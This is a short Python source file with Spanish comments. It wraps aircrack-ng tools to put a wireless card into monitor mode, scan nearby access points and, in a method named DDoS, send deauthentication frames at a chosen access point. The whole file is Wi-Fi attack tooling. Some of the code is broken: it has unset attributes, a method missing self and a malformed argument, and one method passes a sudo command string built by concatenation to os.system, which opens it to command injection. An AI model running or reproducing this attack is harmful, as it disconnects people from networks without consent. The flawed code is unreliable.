import os
import subprocess as sp
import asyncio


class Command_Template:
    def __init__(self):
        self.interface
        self.command

    def report():
        pass


"""
Todos los comandos tiene su propia clase, y el atributo
command contiene el comando que se ingresará a la terminal
    Returns:
        _type_: _description_
"""


class Airmon:
    def __init__(self, interface):
        self.interface = interface
        self.command = 'airmon-ng'

    async def monitor_mode(self):
        out = sp.check_output([self.command, 'start', self.interface])
        print(out)


class Airodump:
    def __init__(self, interface):
        self.interface = interface
        self.command = 'airodump-ng'

    def general_scan(self):
        out = sp.check_output(
            [self.command, '--output-format', 'csv', '-w', 'general_scan', self.interface])

    async def channel_scan(self, channel):
        out = sp.check_output([self.command, '-c', channel, '--output-format',
                              'csv', '-w', 'channel_scan', self.interface])


class Aireplay:

    def __init__(self, ap, interface):
        self.ap = ap
        self.command = 'aireplay-ng'
        self.interface = interface

    async def DDoS(self):
        sp.check_output([self.command, ' -0', '10', '-a',
                        self.ap['AP_MAC'], self.interface])
        return 1

    async def channel(self, interface):
        os.system('sudo airodump-ng -c 2 ' + interface)
